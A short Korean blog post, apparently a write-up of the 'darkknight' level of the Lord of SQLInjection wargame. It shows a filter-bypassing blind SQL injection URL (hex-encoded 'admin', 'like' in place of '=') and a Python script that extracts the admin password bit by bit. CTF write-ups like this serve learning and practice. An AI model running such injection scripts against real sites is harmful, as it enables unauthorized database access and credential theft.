---
layout: post
title: LOS Darkknight 
date: 2015-10-22 18:14:00 +0900
category: Hacking
---
pw 는 '가 필터링 되므로  no  부분에서 공격 

substr, ascii, = 이 필터링 되므로 admin 을  hex로 바꾸고 

=대신 like를 써서 공격한다.


```
http://los.sandbox.cash/chall/darkknight_141d7d5d93452a2e1f8c1ab8ecb81a92.php?no=0||id%20like%200x61646d696e%26%26mid(lpad(bin(ord(mid(pw,1,1))),8,0),8,1)
```







```
import requests
 
 
 
key=""
site=""
q=0
w=1
header={'Cookie':'PHPSESSID='}
for j in range(1,12):
        for i in reversed(range(1,9)):
                site="http://los.sandbox.cash/chall/darkknight_141d7d5d93452a2e1f8c1ab8ecb81a92.php?no="
                site+="0||id%20like%200x61646d696e%26%26mid(lpad(bin(ord(mid(pw,"+str(j)+",1))),8,0),"+str(i)+",1)"
                print (site)
                r=requests.put(site,headers=header)
                
                if "<br><h2>Hello admin" in r.text:
                  q+=w
                w=w*2
        key+=chr(q)
        print ("\nkey : "+key+"\n")
        q=0
        w=1
                
```





예전에 풀었던 풀이는 잃어버려서 진우껄 빌려왔다.



출처 : http://unknown84.tistory.com/16





